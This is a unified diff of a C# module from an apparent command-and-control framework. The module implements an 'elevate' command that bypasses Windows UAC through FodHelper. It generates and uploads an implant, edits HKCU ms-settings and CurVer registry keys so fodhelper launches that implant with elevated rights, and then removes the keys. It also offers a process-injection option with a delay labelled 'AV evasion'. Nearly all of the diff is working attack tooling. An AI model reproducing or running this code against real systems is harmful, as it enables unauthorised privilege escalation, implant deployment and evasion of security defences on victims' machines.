@@ -1,64 +1,58 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.CommandLine;
-using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using Commander.Commands.Agent;
-using Commander.Commands.Scripted;
-using Commander.Executor;
-using Common;
 using Common.Payload;
 using Shared;
-using Spectre.Console;
 
-namespace Commander.Commands.Composite
+namespace Common.Command.Custom
 {
     public class ElevateCommandOptions
     {
+        [CommandOption("-k", "--key", "Name of the key to use", "c2s")]
         public string key { get; set; }
+
+        [CommandOption("-v", "--verbose", "Show details of the command execution.")]
         public bool verbose { get; set; }
 
+        [CommandOption("-n", "--pipe", "Name of the pipe used to pivot.", "elev8")]
         public string pipe { get; set; }
+
+        [CommandOption("-f", "--file", "FileName of payload.", null)]
         public string file { get; set; }
+
+        [CommandOption("-p", "--path", "Name of the folder to upload the payload.", "c:\\windows\\tasks")]
         public string path { get; set; }
 
+        [CommandOption("-i", "--inject", "If the payload should be an injector")]
         public bool inject { get; set; }
 
+        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
         public int injectDelay { get; set; }
 
+        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
         public string injectProcess { get; set; }
 
+        [CommandOption("-x86", "--x86", "Generate a x86 architecture executable")]
         public bool x86 { get; set; }
-
-
     }
-    public class ElevateCommand : ScriptCommand<ElevateCommandOptions>
+
+    public class ElevateCommand : CustomCommand<ElevateCommandOptions>
     {
-        public override string Description => "UAC Bypass using FodHelper";
         public override string Name => "elevate";
-        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
 
-        public override string Category => CommandCategory.ToRework;
+        public override string Description => "UAC Bypass using FodHelper";
 
-        public override Shared.OsType[] SupportedOs => new[] { Shared.OsType.Windows };
+        public override OsType[] SupportedOs => new OsType[] { OsType.Windows };
 
-        public override RootCommand Command => new RootCommand(this.Description)
+
+        protected override async Task<bool> Run(CommandExecutionContext<ElevateCommandOptions> context)
         {
-             new Option<string>(new[] { "--key", "-k" }, () => "c2s", "Name of the key to use"),
-             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
-             new Option<string>(new[] { "--pipe", "-n" }, () => "elev8","Name of the pipe used to pivot."),
-             new Option<string>(new[] { "--file", "-f" }, () => null,"FileName of payload."),
-             new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows\\tasks","Name of the folder to upload the payload."),
-             //new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
-             //new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
-             //new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
-             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
-        };
+            var options = context.Options;
+            var commander = context.Commander;
+            var agent = context.Agent;
 
-        protected override void Run(ScriptingAgent<ElevateCommandOptions> agent, ScriptingCommander<ElevateCommandOptions> commander, ScriptingTeamServer<ElevateCommandOptions> teamServer, ElevateCommandOptions options, CommanderConfig config)
-        {
             var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
             var payloadOptions = new ImplantConfig()
             {
@@ -81,34 +75,37 @@ namespace Commander.Commands.Composite
             if (implant == null)
             {
                 commander.WriteError($"[X] Generation Failed!");
-                return;
+                return false;
             }
             else
                 commander.WriteSuccess($"[+] Generation succeed!");
 
 
-            commander.WriteLine($"Preparing to upload the file...");
-
-
-
+            commander.WriteInfo($"[>] Preparing File Upload...");
             var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
             string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
+            
             agent.Echo($"Uploading file {fileName} to {path}");
             agent.Upload(Convert.FromBase64String(implant.Data), path);
             agent.Delay(1);
+
+            commander.WriteInfo($"[>] Preparing Editing RegistryKey...");
             agent.Echo($"Altering registry Keys");
             //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
             agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
             //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
             agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
             agent.Delay(10);
+            commander.WriteInfo($"[>] Preparing FodHelper start...");
             agent.Echo($"Starting fodhelper");
             agent.Shell("fodhelper");
             agent.Delay(10);
+
+            commander.WriteInfo($"[>] Preparing Cleaning...");
             agent.Echo($"Cleaning");
             //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
             //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
@@ -131,6 +128,8 @@ namespace Commander.Commands.Composite
             agent.Delay(2);
             agent.Echo($"[*] Execution done!");
             agent.Echo(Environment.NewLine);
+
+            return true;
         }
     }
 }
